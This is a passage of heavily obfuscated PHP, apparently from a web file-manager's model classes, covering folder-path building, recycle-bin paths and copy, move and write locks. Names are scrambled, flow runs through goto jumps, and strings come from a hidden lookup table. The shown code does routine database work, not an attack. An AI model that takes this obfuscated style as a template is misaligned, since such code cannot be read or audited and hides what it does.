E´¼µìËë; Cêö¨æ°¾É: $FÊ¨Ïëößñ = $this->_listAppendPath($aª¶˜Õ“á¯, !0); foreach ($Cİè¯ÑŠì· as $Fäôâ¹™öî => &$EÈ°¤İñ) { if (!is_array($EÈ°¤İñ[$BÎ×õÓ˜­‘[408]])) { continue; } if ($EÈ°¤İñ[$BÎ×õÓ˜­‘[406]] != $BÎ×õÓ˜­‘[509]) { continue; } if (isset($A¿”—–¹Ó¿[$EÈ°¤İñ[$BÎ×õÓ˜­‘[397]]])) { goto D ‘÷¬¤Â‘; D ‘÷¬¤Â‘: $eß¯ƒ‹ùƒÊ = $A¿”—–¹Ó¿[$EÈ°¤İñ[$BÎ×õÓ˜­‘[397]]]; if (!is_array($EÈ°¤İñ[$BÎ×õÓ˜­‘[459]])) { $EÈ°¤İñ[$BÎ×õÓ˜­‘[459]] = array(); } $EÈ°¤İñ[$BÎ×õÓ˜­‘[459]][$BÎ×õÓ˜­‘[510]] = $eß¯ƒ‹ùƒÊ[$BÎ×õÓ˜­‘[504]]; goto eåÆŒ÷Çî›; eåÆŒ÷Çî›: $EÈ°¤İñ[$BÎ×õÓ˜­‘[408]][$BÎ×õÓ˜­‘[511]] = $eß¯ƒ‹ùƒÊ; $EÈ°¤İñ[$BÎ×õÓ˜­‘[408]][$BÎ×õÓ˜­‘[512]] = $EÈ°¤İñ[$BÎ×õÓ˜­‘[513]]; $EÈ°¤İñ[$BÎ×õÓ˜­‘[408]][$BÎ×õÓ˜­‘[514]] = $BÎ×õÓ˜­‘[87]; goto Aİ‚éÀºõ¡; Aİ‚éÀºõ¡: if ($eß¯ƒ‹ùƒÊ[$BÎ×õÓ˜­‘[446]] != $dØä•Å°Ÿå) { $EÈ°¤İñ[$BÎ×õÓ˜­‘[408]][$BÎ×õÓ˜­‘[409]] = $EÈ°¤İñ[$BÎ×õÓ˜­‘[408]][$BÎ×õÓ˜­‘[409]] & $eß¯ƒ‹ùƒÊ[$BÎ×õÓ˜­‘[408]][$BÎ×õÓ˜­‘[408]]; } continue; goto b…šÜõøéÀ; b…šÜõøéÀ: } $cÂÇ¾¬—³ô = $this->parentLevelArray($EÈ°¤İñ[$BÎ×õÓ˜­‘[515]]); $B¦‰ŠÎŠèŒ = array_reverse($cÂÇ¾¬—³ô); foreach ($B¦‰ŠÎŠèŒ as $aÛÕÍœÉ => $B¨Ñ”œê¸í) { goto BµÕÚ°õĞ; EùÇë’¢ÎÈ: if ($eß¯ƒ‹ùƒÊ[$BÎ×õÓ˜­‘[446]] != $dØä•Å°Ÿå) { $EÈ°¤İñ[$BÎ×õÓ˜­‘[408]][$BÎ×õÓ˜­‘[409]] = $EÈ°¤İñ[$BÎ×õÓ˜­‘[408]][$BÎ×õÓ˜­‘[409]] & $eß¯ƒ‹ùƒÊ[$BÎ×õÓ˜­‘[408]][$BÎ×õÓ˜­‘[408]]; } $A‡¥ŞÑª¶ë = $BÎ×õÓ˜­‘[33]; $C«îŸâ¬‡ = count($cÂÇ¾¬—³ô) - $aÛÕÍœÉ; goto A¬¸«ì‹…Ê; BµÕÚ°õĞ: if (!isset($A¿”—–¹Ó¿[$B¨Ñ”œê¸í])) { continue; } $eß¯ƒ‹ùƒÊ = $A¿”—–¹Ó¿[$B¨Ñ”œê¸í]; $EÈ°¤İñ[$BÎ×õÓ˜­‘[408]][$BÎ×õÓ˜­‘[511]] = $eß¯ƒ‹ùƒÊ; goto EùÇë’¢ÎÈ; A¬¸«ì‹…Ê: for ($A¾îÕŸğöŸ = 0; $A¾îÕŸğöŸ < $C«îŸâ¬‡; $A¾îÕŸğöŸ++) { if (!isset($FÊ¨Ïëößñ[$cÂÇ¾¬—³ô[$A¾îÕŸğöŸ]])) { $A‡¥ŞÑª¶ë = $BÎ×õÓ˜­‘[33]; break; } $A‡¥ŞÑª¶ë = $A‡¥ŞÑª¶ë . rtrim($FÊ¨Ïëößñ[$cÂÇ¾¬—³ô[$A¾îÕŸğöŸ]], $BÎ×õÓ˜­‘[8]) . $BÎ×õÓ˜­‘[8]; } $EÈ°¤İñ[$BÎ×õÓ˜­‘[408]][$BÎ×õÓ˜­‘[512]] = rtrim($A‡¥ŞÑª¶ë, $BÎ×õÓ˜­‘[8]) . $BÎ×õÓ˜­‘[8]; break; goto c²»Âº…”Í; c²»Âº…”Í: } } unset($EÈ°¤İñ); goto c‚ùé¶·ò; c‚ùé¶·ò: } public function groupPathDisplay(&$eíãÅÉÔ) { goto bŒ¿‹È™¾š; bŒ¿‹È™¾š: $Aõ‰±õ»Ç =& $_SERVER[›é¼±]; if ($eíãÅÉÔ[$Aõ‰±õ»Ç[406]] != self::TYPE_GROUP) { return; } $AÛÚƒ¯ßùç = Model($Aõ‰±õ»Ç[516])->getInfo($eíãÅÉÔ[$Aõ‰±õ»Ç[498]]); goto eìàºª»Ç; C†¨‰¢ê¶: $eíãÅÉÔ[$Aõ‰±õ»Ç[521]] = $eƒœ…®Ÿ± . $AÛÚƒ¯ßùç[$Aõ‰±õ»Ç[85]][$Aõ‰±õ»Ç[397]]; goto Cß‘†„Èî; eìàºª»Ç: $EóœÁß×ã• = $this->parentLevelArray($AÛÚƒ¯ßùç[$Aõ‰±õ»Ç[515]]); $eƒœ…®Ÿ± = $Aõ‰±õ»Ç[33]; foreach ($EóœÁß×ã• as $C›æ¡•íßô) { $a´¼£İ‘ÇÁ = Model($Aõ‰±õ»Ç[516])->getInfo($C›æ¡•íßô); $eƒœ…®Ÿ± .= $a´¼£İ‘ÇÁ[$Aõ‰±õ»Ç[85]][$Aõ‰±õ»Ç[397]] . $Aõ‰±õ»Ç[47]; } goto dÁİ ãö; dÁİ ãö: $eíãÅÉÔ[$Aõ‰±õ»Ç[517]] = $AÛÚƒ¯ßùç[$Aõ‰±õ»Ç[492]]; $eíãÅÉÔ[$Aõ‰±õ»Ç[518]] = $AÛÚƒ¯ßùç[$Aõ‰±õ»Ç[515]]; $eíãÅÉÔ[$Aõ‰±õ»Ç[519]] = $AÛÚƒ¯ßùç[$Aõ‰±õ»Ç[520]]; goto C†¨‰¢ê¶; Cß‘†„Èî: } protected function _listAppendPath(&$ešˆ‘¶­äÜ, $c„Ç§Š…‡¤ = false) { goto Eš·Ş¢‹ª’; C“³šíâ‰œ: $A’Òô„—§Ù = array(); if ($c„Ç§Š…‡¤) { return $c”±…… …‰; } foreach ($ešˆ‘¶­äÜ as &$B›½ºÇŞ—­) { goto A¸¥‚íÇ½ã; Aœî¾ÈÑ®Ü: foreach ($a“ÎÓ×Î• as $bã»„²óÉ => $e˜äâÚÙ­») { if (isset($c”±…… …‰[$e˜äâÚÙ­»])) { continue; } if ($bã»„²óÉ == 0) { $c”±…… …‰[$e˜äâÚÙ­»] = $this->_listAppendPathRoot($B›½ºÇŞ—­, $a“ÎÓ×Î•); } if ($bã»„²óÉ != 0) { $b ¢†òÖÅ[] = $e˜äâÚÙ­»; } } goto a¸‹¾™’ª¿; AŠî¼˜â¬: if (isset($A’Òô„—§Ù[$B›½ºÇŞ—­[$EÄ±âĞ„ß[515]]])) { continue; } $A’Òô„—§Ù[$B›½ºÇŞ—­[$EÄ±âĞ„ß[515]]] = !0; $a“ÎÓ×Î• = $this->parentLevelArray($B›½ºÇŞ—­[$EÄ±âĞ„ß[515]]); goto Aœî¾ÈÑ®Ü; A¸¥‚íÇ½ã: $FªœÄÉÍ‘ = $B›½ºÇŞ—­[$EÄ±âĞ„ß[397]]; if ($B›½ºÇŞ—­[$EÄ±âĞ„ß[405]] == $EÄ±âĞ„ß[87] && $B›½ºÇŞ—­[$EÄ±âĞ„ß[492]] != 0) { $c”±…… …‰[$FªœÄÉÍ‘] = $B›½ºÇŞ—­[$EÄ±âĞ„ß[28]]; } if ($B›½ºÇŞ—­[$EÄ±âĞ„ß[405]] == $EÄ±âĞ„ß[87] && $B›½ºÇŞ—­[$EÄ±âĞ„ß[492]] == 0 && !isset($c”±…… …‰[$FªœÄÉÍ‘])) { $c”±…… …‰[$FªœÄÉÍ‘] = $this->_listAppendPathRoot($B›½ºÇŞ—­, array()); } goto AŠî¼˜â¬; a¸‹¾™’ª¿: } goto AÇ¿åå¥‘¾; fšê‚òáËñ: unset($B›½ºÇŞ—­); return $ešˆ‘¶­äÜ; goto D‡¢¯Ê­Í; Eš·Ş¢‹ª’: $EÄ±âĞ„ß =& $_SERVER[›é¼±]; static $c”±…… …‰ = array(); $b ¢†òÖÅ = array(); goto C“³šíâ‰œ; eåÁ°ÃÈÈÀ: $D˜®«–ì„ = KodIO::sourceID(IO_PATH_SYSTEM_RECYCLE); $e£ØÒàôÏĞ = array(); foreach ($ešˆ‘¶­äÜ as &$B›½ºÇŞ—­) { goto D‹ï‹äßîâ; Eê›ãä©”: if ($B›½ºÇŞ—­[$EÄ±âĞ„ß[492]] == $EÄ±âĞ„ß[191]) { $B›½ºÇŞ—­[$EÄ±âĞ„ß[28]] = trim($c”±…… …‰[$B›½ºÇŞ—­[$EÄ±âĞ„ß[397]]], $EÄ±âĞ„ß[8]); $B›½ºÇŞ—­[$EÄ±âĞ„ß[513]] = $B›½ºÇŞ—­[$EÄ±âĞ„ß[28]] . $EÄ±âĞ„ß[8]; } if (intval($B›½ºÇŞ—­[$EÄ±âĞ„ß[406]]) == self::TYPE_SYSTEM) { $this->_listAppendPathRecycle($B›½ºÇŞ—­, $a“ÎÓ×Î•, $D˜®«–ì„); } goto aá¤ÁÌ»œ; D‹ï‹äßîâ: $dÔÍ±ÖÌóë = $B›½ºÇŞ—­[$EÄ±âĞ„ß[515]]; $f¸„“ùÈ¬¤ = $EÄ±âĞ„ß[33]; if (isset($e£ØÒàôÏĞ[$dÔÍ±ÖÌóë])) { $f¸„“ùÈ¬¤ = $e£ØÒàôÏĞ[$dÔÍ±ÖÌóë]; } else { $a“ÎÓ×Î• = $this->parentLevelArray($B›½ºÇŞ—­[$EÄ±âĞ„ß[515]]); foreach ($a“ÎÓ×Î• as $bã»„²óÉ => $e˜äâÚÙ­») { if (isset($c”±…… …‰[$e˜äâÚÙ­»])) { $f¸„“ùÈ¬¤ .= $c”±…… …‰[$e˜äâÚÙ­»] . $EÄ±âĞ„ß[8]; } } $e£ØÒàôÏĞ[$dÔÍ±ÖÌóë] = $f¸„“ùÈ¬¤; } goto f…º½ªš˜; f…º½ªš˜: $f¸„“ùÈ¬¤ .= $B›½ºÇŞ—­[$EÄ±âĞ„ß[28]]; if ($B›½ºÇŞ—­[$EÄ±âĞ„ß[405]] == $EÄ±âĞ„ß[87]) { $f¸„“ùÈ¬¤ .= $EÄ±âĞ„ß[8]; } $B›½ºÇŞ—­[$EÄ±âĞ„ß[513]] = str_replace($EÄ±âĞ„ß[523], $EÄ±âĞ„ß[8], $f¸„“ùÈ¬¤); goto Eê›ãä©”; aá¤ÁÌ»œ: } goto fšê‚òáËñ; AÇ¿åå¥‘¾: unset($B›½ºÇŞ—­); $b ¢†òÖÅ = array_unique($b ¢†òÖÅ); if (count($b ¢†òÖÅ) > 0) { $bß°òÃ¢…« = array($EÄ±âĞ„ß[412] => array($EÄ±âĞ„ß[413], $b ¢†òÖÅ)); if (count($b ¢†òÖÅ) == 1) { $FÍš±Ëğ£„ = $this->sourceInfo($b ¢†òÖÅ[0]); $c™³á’Üõ± = is_array($FÍš±Ëğ£„) ? array($FÍš±Ëğ£„) : !1; } else { $c™³á’Üõ± = $this->field($EÄ±âĞ„ß[522])->where($bß°òÃ¢…«)->select(); } if (!$c™³á’Üõ±) { $c™³á’Üõ± = array(); } foreach ($c™³á’Üõ± as $a¤éäˆ‹Ò„) { $c”±…… …‰[$a¤éäˆ‹Ò„[$EÄ±âĞ„ß[397]]] = $a¤éäˆ‹Ò„[$EÄ±âĞ„ß[28]]; } } goto eåÁ°ÃÈÈÀ; D‡¢¯Ê­Í: } private function _listAppendPathRecycle(&$fÅ¹àˆ…·æ, $C”Îœùµæ, $dŸƒ¼ßƒ²­) { goto CÆî’é¤¦Ë; c²òõÖâµë: if ($fÅ¹àˆ…·æ[$a“…ˆÚ„ïõ[397]] == $dŸƒ¼ßƒ²­) { $fÅ¹àˆ…·æ[$a“…ˆÚ„ïõ[515]] = $a“…ˆÚ„ïõ[525]; $fÅ¹àˆ…·æ[$a“…ˆÚ„ïõ[492]] = $a“…ˆÚ„ïõ[191]; $fÅ¹àˆ…·æ[$a“…ˆÚ„ïõ[28]] = LNG($a“…ˆÚ„ïõ[524]); } $fÅ¹àˆ…·æ[$a“…ˆÚ„ïõ[526]] = $a“…ˆÚ„ïõ[527]; goto D…¬Ì‹®Î; cô´ÉÉËÂ: $d†°Ÿ‡¤ = implode($a“…ˆÚ„ïõ[8], array_slice($a†Ì—ÎÛ, 2)); $fÅ¹àˆ…·æ[$a“…ˆÚ„ïõ[513]] = $a“…ˆÚ„ïõ[8] . LNG($a“…ˆÚ„ïõ[524]) . $a“…ˆÚ„ïõ[8] . ltrim($d†°Ÿ‡¤, $a“…ˆÚ„ïõ[8]); $fÅ¹àˆ…·æ[$a“…ˆÚ„ïõ[515]] = $a“…ˆÚ„ïõ[525] . implode($a“…ˆÚ„ïõ[47], array_slice($C”Îœùµæ, 1)) . $a“…ˆÚ„ïõ[47]; goto c²òõÖâµë; CÆî’é¤¦Ë: $a“…ˆÚ„ïõ =& $_SERVER[›é¼±]; if (!in_array($dŸƒ¼ßƒ²­, $C”Îœùµæ) && $fÅ¹àˆ…·æ[$a“…ˆÚ„ïõ[397]] != $dŸƒ¼ßƒ²­) { return; } $a†Ì—ÎÛ = explode($a“…ˆÚ„ïõ[8], trim($fÅ¹àˆ…·æ[$a“…ˆÚ„ïõ[513]], $a“…ˆÚ„ïõ[8])); goto cô´ÉÉËÂ; D…¬Ì‹®Î: } protected function _listAppendPathRoot(&$eé¨©èĞ»í, $F—Î™…‹×Ÿ) { $f‚Ø‘æ¡ˆ³ =& $_SERVER[›é¼±]; $Dë…šàÅ·¦ = $f‚Ø‘æ¡ˆ³[33]; if ($eé¨©èĞ»í[$f‚Ø‘æ¡ˆ³[406]] == self::TYPE_USER) { if (defined($f‚Ø‘æ¡ˆ³[468]) && $eé¨©èĞ»í[$f‚Ø‘æ¡ˆ³[498]] == USER_ID) { $Dë…šàÅ·¦ = LNG($f‚Ø‘æ¡ˆ³[528]); if (!$F—Î™…‹×Ÿ) { $eé¨©èĞ»í[$f‚Ø‘æ¡ˆ³[28]] = $Dë…šàÅ·¦; } } else { $bš®—íˆÜ = Model($f‚Ø‘æ¡ˆ³[507])->getInfoSimple($eé¨©èĞ»í[$f‚Ø‘æ¡ˆ³[498]]); $Dë…šàÅ·¦ = LNG($f‚Ø‘æ¡ˆ³[529]) . $f‚Ø‘æ¡ˆ³[160] . $bš®—íˆÜ[$f‚Ø‘æ¡ˆ³[28]] . $f‚Ø‘æ¡ˆ³[530]; } } else { if ($eé¨©èĞ»í[$f‚Ø‘æ¡ˆ³[406]] == self::TYPE_GROUP) { $bš®—íˆÜ = Model($f‚Ø‘æ¡ˆ³[516])->getInfoSimple($eé¨©èĞ»í[$f‚Ø‘æ¡ˆ³[498]]); $Dë…šàÅ·¦ = $bš®—íˆÜ[$f‚Ø‘æ¡ˆ³[28]]; } else { if ($eé¨©èĞ»í[$f‚Ø‘æ¡ˆ³[406]] == self::TYPE_SYSTEM) { $Dë…šàÅ·¦ = $f‚Ø‘æ¡ˆ³[531]; } } } $Dë…šàÅ·¦ = $Dë…šàÅ·¦ ? $f‚Ø‘æ¡ˆ³[8] . $Dë…šàÅ·¦ . $f‚Ø‘æ¡ˆ³[8] : $f‚Ø‘æ¡ˆ³[8]; return $Dë…šàÅ·¦; } protected function _listAppendUser(&$Fô–™àğÎ) { goto e¿îÔ‘Ø×Ç; DÊÙñæğÍâ: $C¶Åå³ØœÚ = array_merge($DÏë‰÷æ®, $F¢ä†ÒƒŒ); $AËËŠîî« = Model($Aîİ¨Ôˆˆ[532])->userListInfo($C¶Åå³ØœÚ); foreach ($Fô–™àğÎ as &$C¸÷²½´) { $fŸ¶ÒÂÎ÷Ä = $C¸÷²½´[$Aîİ¨Ôˆˆ[446]]; $C¸÷²½´[$Aîİ¨Ôˆˆ[446]] = $AËËŠîî«[$fŸ¶ÒÂÎ÷Ä] ? $AËËŠîî«[$fŸ¶ÒÂÎ÷Ä] : !1; $fŸ¶ÒÂÎ÷Ä = $C¸÷²½´[$Aîİ¨Ôˆˆ[448]]; $C¸÷²½´[$Aîİ¨Ôˆˆ[448]] = $AËËŠîî«[$fŸ¶ÒÂÎ÷Ä] ? $AËËŠîî«[$fŸ¶ÒÂÎ÷Ä] : !1; if (isset($C¸÷²½´[$Aîİ¨Ôˆˆ[459]]) && $C¸÷²½´[$Aîİ¨Ôˆˆ[459]][$Aîİ¨Ôˆˆ[533]]) { $e³¼­¶º²£ = $GLOBALS[$Aîİ¨Ôˆˆ[6]][$Aîİ¨Ôˆˆ[88]][$Aîİ¨Ôˆˆ[534]]; if ($C¸÷²½´[$Aîİ¨Ôˆˆ[459]][$Aîİ¨Ôˆˆ[535]] <= time() - $e³¼­¶º²£) { $this->metaSet($C¸÷²½´[$Aîİ¨Ôˆˆ[397]], $Aîİ¨Ôˆˆ[533], null); $this->metaSet($C¸÷²½´[$Aîİ¨Ôˆˆ[397]], $Aîİ¨Ôˆˆ[535], null); unset($C¸÷²½´[$Aîİ¨Ôˆˆ[459]][$Aîİ¨Ôˆˆ[533]]); continue; } $Fà«É¿ÕĞÙ = $C¸÷²½´[$Aîİ¨Ôˆˆ[459]][$Aîİ¨Ôˆˆ[533]]; $C¸÷²½´[$Aîİ¨Ôˆˆ[459]][$Aîİ¨Ôˆˆ[536]] = Model($Aîİ¨Ôˆˆ[532])->getInfoSimpleOuter($Fà«É¿ÕĞÙ); } } goto bË¢œ¾ÛÖ“; e¿îÔ‘Ø×Ç: $Aîİ¨Ôˆˆ =& $_SERVER[›é¼±]; $DÏë‰÷æ® = array_to_keyvalue($Fô–™àğÎ, $Aîİ¨Ôˆˆ[33], $Aîİ¨Ôˆˆ[446]); $F¢ä†ÒƒŒ = array_to_keyvalue($Fô–™àğÎ, $Aîİ¨Ôˆˆ[33], $Aîİ¨Ôˆˆ[448]); goto DÊÙñæğÍâ; bË¢œ¾ÛÖ“: unset($C¸÷²½´); goto BòÍÅÌë—; BòÍÅÌë—: } public function parentLevelArray($EóÄ˜»Á×) { $cäš©…ÈÄ =& $_SERVER[›é¼±]; $EóÄ˜»Á× = explode($cäš©…ÈÄ[47], trim($EóÄ˜»Á×, $cäš©…ÈÄ[47])); return array_remove_value($EóÄ˜»Á×, $cäš©…ÈÄ[191]); } public function listAll($E“¨¢†êİ) { goto D†Ñ¡»¤¯±; eªñ¿Í»Úà: $e²ÄÎÁª´Á = $F•®‰‰’ÊÜ[541]; $aºØ†¡·â = "\114\105\106\124\x20\x4a\117\111\116\40{$this->tablePrefix}\151\157\137\x66\x69\154\145\40\146\x69\x6c\145\40\x6f\156\x20\x73\157\165\x72\x63\145\x2e\146\151\154\145\x49\x44\40\x3d\40\x66\151\x6c\145\x2e\146\x69\x6c\145\111\x44"; $Cğ¬Ş«»·ö = $this->alias($F•®‰‰’ÊÜ[438])->field($e²ÄÎÁª´Á)->where($dÕòï„ó™)->join($aºØ†¡·â)->select(); goto dñ¹›‚; dñ¹›‚: $this->_listAppendAuth($Cğ¬Ş«»·ö); $this->_listAppendUser($Cğ¬Ş«»·ö); $this->_listAppendPath($Cğ¬Ş«»·ö); goto bØôÓöÏ¿Ğ; D†Ñ¡»¤¯±: $F•®‰‰’ÊÜ =& $_SERVER[›é¼±]; $B®‡×»­ï = $this->sourceInfo($E“¨¢†êİ); $dÕòï„ó™ = array($F•®‰‰’ÊÜ[537] => array($F•®‰‰’ÊÜ[538], $B®‡×»­ï[$F•®‰‰’ÊÜ[515]] . $E“¨¢†êİ . $F•®‰‰’ÊÜ[539]), $F•®‰‰’ÊÜ[540] => 0); goto eªñ¿Í»Úà; Cëñ—ê‡¥›: $fø¾à‹Ò°˜ = array(); foreach ($Cğ¬Ş«»·ö as $cî‘˜„‰›ó => $eÉ¸Â²¦¬×) { goto E’…Å”Ê¸; FÃ‚ÖâÔ–: for ($bÄŸ­ÒïŞ = 0; $bÄŸ­ÒïŞ < count($eŞå—Ô­ª»); $bÄŸ­ÒïŞ++) { $e‚—®‰š­ä .= $Cğ¬Ş«»·ö[$eŞå—Ô­ª»[$bÄŸ­ÒïŞ]][$F•®‰‰’ÊÜ[28]] . $F•®‰‰’ÊÜ[8]; } $e‚—®‰š­ä .= $eÉ¸Â²¦¬×[$F•®‰‰’ÊÜ[28]]; if ($eÉ¸Â²¦¬×[$F•®‰‰’ÊÜ[405]]) { $e‚—®‰š­ä .= $F•®‰‰’ÊÜ[8]; } goto báÃ‡»ïõ; báÃ‡»ïõ: $e‚—®‰š­ä = str_replace($F•®‰‰’ÊÜ[523], $F•®‰‰’ÊÜ[8], $e‚—®‰š­ä); $e‚—®‰š­ä = str_replace($F•®‰‰’ÊÜ[523], $F•®‰‰’ÊÜ[8], $e‚—®‰š­ä); $d˜–Ş¸ÑÏ® = array($F•®‰‰’ÊÜ[416] => str_replace($F•®‰‰’ÊÜ[523], $F•®‰‰’ÊÜ[8], $e‚—®‰š­ä), $F•®‰‰’ÊÜ[542] => intval($eÉ¸Â²¦¬×[$F•®‰‰’ÊÜ[405]]), $F•®‰‰’ÊÜ[85] => $this->pathInfoFilter($eÉ¸Â²¦¬×)); goto bˆŞÍ”è¯À; E’…Å”Ê¸: $eŞå—Ô­ª» = $this->parentLevelArray($eÉ¸Â²¦¬×[$F•®‰‰’ÊÜ[515]]); array_shift($eŞå—Ô­ª»); $e‚—®‰š­ä = $F¸´¢½ë›é; goto FÃ‚ÖâÔ–; bˆŞÍ”è¯À: if (!$eÉ¸Â²¦¬×[$F•®‰‰’ÊÜ[405]]) { $d˜–Ş¸ÑÏ®[$F•®‰‰’ÊÜ[461]] = $eÉ¸Â²¦¬×[$F•®‰‰’ÊÜ[461]]; $d˜–Ş¸ÑÏ®[$F•®‰‰’ÊÜ[86]] = $eÉ¸Â²¦¬×[$F•®‰‰’ÊÜ[76]]; } $fø¾à‹Ò°˜[] = $d˜–Ş¸ÑÏ®; goto CêÃÈÚƒòÜ; CêÃÈÚƒòÜ: } return $fø¾à‹Ò°˜; goto e¶‡™‡¼·Ú; bØôÓöÏ¿Ğ: $Cğ¬Ş«»·ö = array_to_keyvalue($Cğ¬Ş«»·ö, $F•®‰‰’ÊÜ[397]); $F¸´¢½ë›é = "\x2f{$B®‡×»­ï[$F•®‰‰’ÊÜ[28]]}\57"; $F¸´¢½ë›é = $F¸´¢½ë›é == $F•®‰‰’ÊÜ[523] ? $F•®‰‰’ÊÜ[8] : $F¸´¢½ë›é; goto Cëñ—ê‡¥›; e¶‡™‡¼·Ú: } } class SourceListMoveModel extends SourceListModel { public $allowLockSource = 1; public $moveClearAuth = true; public function allowLock() { return $this->allowLockSource; } public function lockCopyStart($D‹ôÅÁ¥Â) { goto bàóŠ§•‹Ë; c°´•Ùîõ‰: $this->_lockEvent($D‹ôÅÁ¥Â, array($d¼ñŸ„Ì‚[546], $d¼ñŸ„Ì‚[547]), $C¨ŸòÇàÈ); $this->_lockCheckEnd($d¼ñŸ„Ì‚[543], $D‹ôÅÁ¥Â); goto B—«ˆ…Äàƒ; bàóŠ§•‹Ë: $d¼ñŸ„Ì‚ =& $_SERVER[›é¼±]; if (!$this->allowLock()) { return; } $this->_lockCheck($d¼ñŸ„Ì‚[543], $D‹ôÅÁ¥Â); goto D —óÏÆ; D —óÏÆ: $C¨ŸòÇàÈ = 1; $this->_lockEvent($D‹ôÅÁ¥Â, array($d¼ñŸ„Ì‚[544], $d¼ñŸ„Ì‚[545]), $C¨ŸòÇàÈ); $this->_lockParent($D‹ôÅÁ¥Â, array($d¼ñŸ„Ì‚[545]), $C¨ŸòÇàÈ); goto c°´•Ùîõ‰; B—«ˆ…Äàƒ: } public function lockCopyEnd($C¥èÊëêŠª) { $d˜Œ‹ŸøŒ‡ =& $_SERVER[›é¼±]; if (!$this->allowLock()) { return; } $B¦¡Ô½¥ = 0; $this->_lockEvent($C¥èÊëêŠª, array($d˜Œ‹ŸøŒ‡[544], $d˜Œ‹ŸøŒ‡[545]), $B¦¡Ô½¥); $this->_lockParent($C¥èÊëêŠª, array($d˜Œ‹ŸøŒ‡[545]), $B¦¡Ô½¥); $this->_lockEvent($C¥èÊëêŠª, array($d˜Œ‹ŸøŒ‡[546], $d˜Œ‹ŸøŒ‡[547]), $B¦¡Ô½¥); } public function lockWriteStart($dŞ‹öÛŒÙ, $f¦‹³Ê¢õ– = '') { goto e„×²öÑÚá; c¯…Ãó«©é: $FÄ±Í’´¤½ = 1; $this->_lockKey($D’»µ×¹´ù[548] . $dŞ‹öÛŒÙ . $D’»µ×¹´ù[95] . $f¦‹³Ê¢õ–, $FÄ±Í’´¤½); $this->_lockEvent($dŞ‹öÛŒÙ, array($D’»µ×¹´ù[543], $D’»µ×¹´ù[545]), $FÄ±Í’´¤½); goto dæåˆ±ÇŸ ; dæåˆ±ÇŸ : $this->_lockParent($dŞ‹öÛŒÙ, array($D’»µ×¹´ù[543], $D’»µ×¹´ù[545]), $FÄ±Í’´¤½); $this->_lockCheckEnd($D’»µ×¹´ù[544], $dŞ‹öÛŒÙ); goto aÓØ‘Ş…Ÿ; e„×²öÑÚá: $D’»µ×¹´ù =& $_SERVER[›é¼±]; if (!$this->allowLock()) { return; } $this->_lockCheck($D’»µ×¹´ù[544], $dŞ‹öÛŒÙ); goto c¯…Ãó«©é; aÓØ‘Ş…Ÿ: } public function lockWriteEnd($cÃ³äñÄ×±, $e‡ãŠËëˆ‘ = '') { $FïÇ§¿ëğ° =& $_SERVER[›é¼±]; if (!$this->allowLock()) { return; } $b•÷¿ÕÎ…× = 0; $this->_lockKey($FïÇ§¿ëğ°[548] . $cÃ³äñÄ×± . $FïÇ§¿ëğ°[95] . $e‡ãŠËëˆ‘, $b•÷¿ÕÎ…×); $this->_lockEvent($cÃ³äñÄ×±, array($FïÇ§¿ëğ°[543], $FïÇ§¿ëğ°[545]), $b•÷¿ÕÎ…×); $this->_lockParent($cÃ³äñÄ×±, array($FïÇ§¿ëğ°[543], $FïÇ§¿ëğ°[545]), $b•÷¿ÕÎ…×); } public function lockMoveStart($b…”·¿‚è®) { goto BÛà°»ö§; F–ŞÍà•Şä: $this->_lockParent($b…”·¿‚è®, array($F¿Õµä¯•[543], $F¿Õµä¯•[545]), $f„µ¡˜ÈˆÁ); $this->_lockEvent($b…”·¿‚è®, array($F¿Õµä¯•[550], $F¿Õµä¯•[546], $F¿Õµä¯•[547]), $f„µ¡˜ÈˆÁ); $this->_lockCheckEnd($F¿Õµä¯•[545], $b…”·¿‚è®); goto AÓöãÜ»Ä¯; Böš¹„èåÎ: $f„µ¡˜ÈˆÁ = 1; $this->_lockKey($F¿Õµä¯•[549] . $b…”·¿‚è®, $f„µ¡˜ÈˆÁ); $this->_lockEvent($b…”·¿‚è®, array($F¿Õµä¯•[543], $F¿Õµä¯•[544]), $f„µ¡˜ÈˆÁ); goto F–ŞÍà•Şä; BÛà°»ö§: $F¿Õµä¯• =& $_SERVER[›é¼±]; if (!$this->allowLock()) { return; } $this->_lockCheck($F¿Õµä¯•[545], $b…”·¿‚è®); goto Böš¹„èåÎ; AÓöãÜ»Ä¯: } public function lockMoveEnd($cáÕÖ›²¦Ğ) { goto Dë«ÒÏÖ–Æ; Dë«ÒÏÖ–Æ: $eŠŒ×ÏºàÂ =& $_SERVER[›é¼±]; if (!$this->allowLock()) { return; } $B¾õÈÙïÂ = 0; goto dÏÁ‰¼Ğ—¨; dÏÁ‰¼Ğ—¨: $this->_lockKey($eŠŒ×ÏºàÂ[549] . $cáÕÖ›²¦Ğ, $B¾õÈÙïÂ); $this->_lockEvent($cáÕÖ›²¦Ğ, array($eŠŒ×ÏºàÂ[543], $eŠŒ×ÏºàÂ[544]), $B¾õÈÙïÂ); $this->_lockParent($cáÕÖ›²¦Ğ, array($eŠŒ×ÏºàÂ[543], $eŠŒ×ÏºàÂ[545]), $B¾õÈÙïÂ); goto b¼®ÍÀƒõ; b¼®ÍÀƒõ: $this->_lockEvent($cáÕÖ›²¦Ğ, array($eŠŒ×ÏºàÂ[550], $eŠŒ×ÏºàÂ[546], $eŠŒ×ÏºàÂ[547]), $B¾õÈÙïÂ); goto Aè«ˆõù; Aè«ˆõù: } private function _lockCheck($EÇœ‹ÂŠ°, $a»Ï¤ê¿¯§) { goto E‡¯ÀÜ…š™; EÛÉ©ƒèÙ¨: $BÀº²‡‹¨ö = array_reverse($this->parentLevelArray($aÚá ¦ÔÆ[$dŠ†ËâÍÌŠ[515]])); foreach ($BÀº²‡‹¨ö as $e¹³ßä±©‚) { $fíÂ´¥Ç‰Ø = $EÇœ‹ÂŠ° . $dŠ†ËâÍÌŠ[552] . $e¹³ßä±©‚; if (CacheLock::lockGet($dŠ†ËâÍÌŠ[553] . $fíÂ´¥Ç‰Ø)) { $aÚá ¦ÔÆ = $this->sourceInfo($e¹³ßä±©‚); CacheLock::setErrorMsg($dŠ†ËâÍÌŠ[160] . htmlspecialchars($aÚá ¦ÔÆ[$dŠ†ËâÍÌŠ[28]]) . $dŠ†ËâÍÌŠ[530] . $C‘·ÜèìÒ¨); $this->_lockKey($fíÂ´¥Ç‰Ø, 1); $this->_lockKey($fíÂ´¥Ç‰Ø, 0); } } goto fßñí¸­†Æ; f¹ğ¤‡æà: $this->_lockTimeStart[$fíÂ´¥Ç‰Ø] = timeFloat(); if (!is_array($aÚá ¦ÔÆ)) { return; } $C‘·ÜèìÒ¨ = LNG($dŠ†ËâÍÌŠ[551]); goto FÑº…ÌÑ”ß; 